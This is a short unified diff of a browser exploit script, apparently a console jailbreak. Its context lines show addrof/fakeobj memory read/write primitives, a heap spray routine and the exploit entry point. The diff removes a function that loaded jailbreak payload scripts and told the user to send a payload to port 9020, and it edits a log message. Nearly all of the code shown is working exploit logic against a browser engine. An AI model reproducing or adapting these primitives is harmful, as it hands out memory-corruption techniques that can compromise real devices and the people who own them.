@@ -116,40 +116,12 @@ function setupRW() {
 	g_jsview_butterfly = new Int64(bf);
 	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))
 		die("[!] Failed to setup addrof/fakeobj primitives");
-	debug_log("Exploit Complete..Running Jailbreak !!");
+	debug_log("->Exploit Complete..Run Payloads !!");
 
 	/* Getting code execution */
 	/* ... */
 	if(window.postExploit)
 		window.postExploit();
-}
-
-function toggle_payload(pld){
-	if(pld == "restore"){
-		document.getElementById("progress").innerHTML="Loading Restore.. Please wait..";
-		preloadScripts(['jb.js', 'preloader.js', 'restore702.js', 'loader.js']);
-	}
-	else if(pld == "usb"){
-		document.getElementById("progress").innerHTML="Loading Restore.. Please wait..";
-		preloadScripts(['jb.js', 'preloader.js', 'usb.js', 'loader.js']);
-	}
-	else if(pld == "copych"){
-		document.getElementById("progress").innerHTML="Loading Restore.. Please wait..";
-		preloadScripts(['jb.js', 'preloader.js', 'CopyCH.js', 'loader.js']);
-	}
-	if(window.postPayload)
-		window.postPayload();
-	payload_finished(pld);
-	
-}
-
-function payload_finished(payload)
-{
-	if(payload == "binloader"){
-		setTimeout(function(){document.getElementById("progress").innerHTML="Awaiting Payload!! Send Payload To Port 9020"; }, 7000);
-	} else {
-		setTimeout(function(){document.getElementById("progress").innerHTML="Restore Loaded Succesfully !!"; }, 7000);
-	}
 }
 
 function read(addr, length) {
@@ -470,7 +442,6 @@ function sprayStringImpl(start, end) {
 }
 
 function go() {
-		/* Init spray */
 	sprayHTMLTextArea();
 
 	if(window.midExploit)
